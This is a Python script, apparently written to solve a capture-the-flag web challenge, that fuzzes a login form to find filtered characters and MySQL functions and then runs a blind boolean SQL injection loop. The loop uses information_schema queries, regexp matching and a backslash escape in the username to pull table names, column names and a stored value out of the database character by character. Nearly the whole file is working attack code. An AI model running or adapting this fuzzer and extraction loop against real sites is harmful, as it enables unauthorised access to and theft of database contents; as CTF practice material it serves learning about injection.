#import all package
#post curl -d "username=user1&password=123" "www.test.com/login"
#
import requests,re,time,os

visableChar = ' !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\t\n'
mysql_function_list = [
	'and','or','in','from','by','into','out','as'
	'ASCII','CHAR_LENGTH','CHARACTER_LENGTH','LCASE','LOWER','LTRIM','REVERSE','RTRIM','TRIM','UCASE','UPPER','SEC_TO_TIME','BINARY',
	'select','delete','insert','update','group','where',
	'updatexml','EXTRACTVALUE',# related to error based injection
	'sleep', #time based injection
	'SYSDATE', 'CONV', 'FORMAT', 'MID', 'SUBSTR', 'CURRENT_DATE', 'EXP', 'LPAD', 'LIKE','RLIKE','TIMEDIFF', 'LOG2', 'LAST_INSERT_ID', 'POWER', 'ADDDATE',
	'MIN', 'LCASE', 'CONVERT', 'LAST_DAY', 'TAN', 'WEEK', 'ATAN', 'FLOOR', 'IFNULL', 'RADIANS', 'LEAST', 'SIGN', 'VERSION', 'YEAR',
	'MINUTE', 'DAYOFWEEK', 'YEARWEEK', 'MAX', 'CURTIME', 'MONTH', 'ASIN', 'ASCII', 'REVERSE', 'TRUNCATE', 'CURRENT_TIMESTAMP', 'SUBDATE', 
	'CURRENT_USER', 'RAND', 'ROUND', 'UPPER', 'COALESCE', 'GREATEST', 'POSITION', 'ACOS', 'PI', 'COUNT', 'REPEAT', 'WEEKOFYEAR', 'DAYOFYEAR', 
	'DEGREES', 'SUBTIME', 'SYSTEM_USER', 'ISNULL', 'ADDTIME', 'CHAR_LENGTH', 'MAKEDATE', 'TIME', 'AVG', 'MOD', 'CURRENT_TIME', 'COS', 'COT', 
	'SUM', 'CEIL', 'TIME_FORMAT', 'SESSION_USER', 'regexp', 'FROM_DAYS', 'LOG10', 'LOCALTIMESTAMP', 'HOUR', 'SEC_TO_TIME', 'REPLACE', 
	'SUBSTRING', 'CAST', 'CHARACTER_LENGTH', 'IF', 'EXTRACT', 'STRCMP', 'LEFT', 'TRIM', 'FIELD', 'SECOND', 'SUBSTRING_INDEX', 'FIND_IN_SET',
	'DATE_FORMAT', 'UCASE', 'DATABASE', 'NULLIF', 'ATAN2', 'NOW', 'RTRIM', 'WEEKDAY', 'LOWER', 'LOG', 'CHARSET', 'PERIOD_DIFF', 'PERIOD_ADD',
	'DATE', 'RPAD', 'CONCAT', 'DAYOFMONTH', 'BIN', 'insert', 'TO_DAYS', 'LTRIM', 'SUBSTRING_INDEX', 'LN', 'POW', 'CONCAT_WS',
	'MICROSECOND', 'STR_TO_DATE', 'LOCALTIME', 'DAY', 'LOCATE', 'DATE_SUB', 'SPACE', 'DATEDIFF', 'DAYNAME', 'CONNECTION_ID', 'MAKETIME', 'ABS',
	'CURDATE', 'QUARTER', 'SIN', 'OrderId', 'RIGHT', 'TIME_TO_SEC', 'TIMESTAMP', 'SQRT', 'MONTHNAME', 'USER','load_file','outfile'
]
def visualize(x):
	if chr(x) in visableChar:
		return chr(x)
	else:
		return hex(x)
# single character fuzz 
def fuzz_single_character(targetUrl,reqType,targetString):
	mylist = []
	for i in range(0,128):	
		data = {
			'username':chr(i),
			'password':'admin'
		}
		if reqType == 'get':
			r = requests.get(targetUrl,data=data)
		else:
			r = requests.post(url=targetUrl,data=data)
		if targetString in r.content:
			print ('[WARNNING] fuzz the username, the character {0} is filtered, ascii={1}'.format(visualize(i),i))
			mylist.append(visualize(i))
		else:
			print('[INFO] {0}'.format(i))
	print ('[WARNNING] fuzz the username',mylist)
	mylist[:] = []
	for i in range(0,128):	
		data = {
			'username':'admin',
			'password':chr(i)
		}
		if reqType == 'get':
			r = requests.get(targetUrl,data=data)
		else:
			r = requests.post(url=targetUrl,data=data)
		if targetString in r.content:
			print ('[WARNNING] fuzz the password, the character {0} is filtered, ascii={1}'.format(visualize(i),i))
			mylist.append(visualize(i))
		else:
			print('[INFO] {0}'.format(i))
	print ('[WARNNING] fuzz the password',mylist)

def fuzz_all_function(targetUrl,reqType,mylist,targetString):
	newlist = mylist
	newlist += [x.upper() for x in mylist]
	newlist += [x.lower() for x in mylist]
	newlist = list(set(newlist))
	filtered_list = []
	for payload in newlist:
		data = {
			'username':payload,
			'password':'admin'
		}
		if reqType == 'get':
			r = requests.get(targetUrl,data=data)
		else:
			r = requests.post(url=targetUrl,data=data)
		if targetString in r.content:
			print ('[WARNNING] fuzz the username, the function {0} is been filtered'.format(payload))
			filtered_list.append(payload)
	print ('[WARNNING] fuzz the username',filtered_list)

	filtered_list[:]=[]
	for payload in newlist:
		data = {
			'username':'admin',
			'password':payload
		}
		if reqType == 'get':
			r = requests.get(targetUrl,data=data)
		else:
			r = requests.post(url=targetUrl,data=data)
		if targetString in r.content:
			print ('[WARNNING] fuzz the password, the function {0} is been filtered'.format(payload))
			filtered_list.append(payload)
	print ('[WARNNING] fuzz the password',filtered_list)
def main():
	url = 'http://ctf5.shiyanbar.com/web/baocuo/index.php'
	fuzz_single_character(url,'post','injection')
	"""
	can't use
	username: # - ; =
	password: # - ; =
	"""
	fuzz_all_function(url,'post',mysql_function_list,'injection')
	"""
	Disabled function are listed as follows.
	username: # - ; =
	password: # - ; =
	"""

def manual_attack():
	url = 'http://ctf5.shiyanbar.com/web/baocuo/index.php'
	username = '\\'
	s = [chr(x) for x in range(32,128)]
	s.remove('.')
	s.remove('$')
	s.remove('*')
	s.remove('+')
	s.remove('?')
	s.remove('^')
	# s += ['-','~',',','#','_']
	# payload = "select * from "
	# payload = """ binary (select * from ffll44jj) regexp '^{0}'"""
	# payload = """ binary (select group_concat(table_name) from information_schema.tables where table_schema regexp database()) regexp '^{0}'"""
	# ffll44jj
	payload = """ binary (select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj') regexp '^{0}'"""
	payload = """ binary (select value from ffll44jj) regexp '^{0}'"""
	# payload = """ binary (select group_concat(table_name) from information_schema.tables where table_schema regexp 'error_based_hpf') regexp '^{0}'"""
	password = """or ({0}) and '1"""
	ans = ''
	for mylen in range(1,20):
		for x in s:
			newpayload = payload.format(ans+x)
			newpassword = password.format(newpayload)
			print newpassword
			# password = '*/(1,concat(0x7e,({0}),0x7e)) or \'1'.format(payload)
			r = requests.post(url=url,data={'username':username,'password':newpassword})
			# print r.content
			if 'welcome' in r.content:
				ans += x
				print (ans)
				break
if __name__ == '__main__':
	# main()
	manual_attack()
	
